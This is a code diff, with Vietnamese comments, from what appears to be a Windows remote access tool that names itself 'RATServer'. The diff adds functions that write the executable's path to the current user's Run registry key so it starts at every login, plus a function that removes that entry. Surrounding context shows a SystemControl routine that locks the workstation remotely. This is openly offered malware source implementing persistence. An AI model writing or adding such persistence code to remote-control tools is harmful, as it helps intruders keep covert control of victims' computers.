@@ -77,3 +77,37 @@ void SystemControl(std::string type) {
         system("rundll32.exe user32.dll,LockWorkStation");
     }
 }
+
+// [MỚI] Hàm thêm chính mình vào Startup
+bool InstallStartup() {
+    char path[MAX_PATH];
+    // 1. Lấy đường dẫn tuyệt đối của file .exe đang chạy
+    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) return false;
+
+    HKEY hKey;
+    // 2. Mở khóa Registry Run của User hiện tại
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
+        return false;
+    }
+
+    // 3. Ghi giá trị (Tên: RATServer, Dữ liệu: Đường dẫn file exe)
+    long result = RegSetValueExA(hKey, "RATServer", 0, REG_SZ, (LPBYTE)path, strlen(path) + 1);
+
+    RegCloseKey(hKey);
+    return (result == ERROR_SUCCESS);
+}
+
+// [MỚI] Hàm gỡ bỏ khỏi Startup
+bool RemoveStartup() {
+    HKEY hKey;
+    // 1. Mở khóa
+    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
+        return false;
+    }
+
+    // 2. Xóa giá trị có tên RATServer
+    long result = RegDeleteValueA(hKey, "RATServer");
+
+    RegCloseKey(hKey);
+    return (result == ERROR_SUCCESS);
+}
